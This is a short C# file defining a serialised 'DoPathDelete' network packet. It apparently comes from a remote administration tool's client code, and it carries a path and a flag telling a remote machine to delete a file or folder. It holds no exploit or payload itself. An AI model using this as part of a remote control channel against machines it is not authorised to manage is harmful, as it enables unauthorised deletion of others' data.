using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoPathDelete : IPacket
    {
        [ProtoMember(1)]
        public string Path { get; set; }

        [ProtoMember(2)]
        public bool IsDirectory { get; set; }

        public DoPathDelete()
        {
        }

        public DoPathDelete(string path, bool isdirectory)
        {
            this.Path = path;
            this.IsDirectory = isdirectory;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}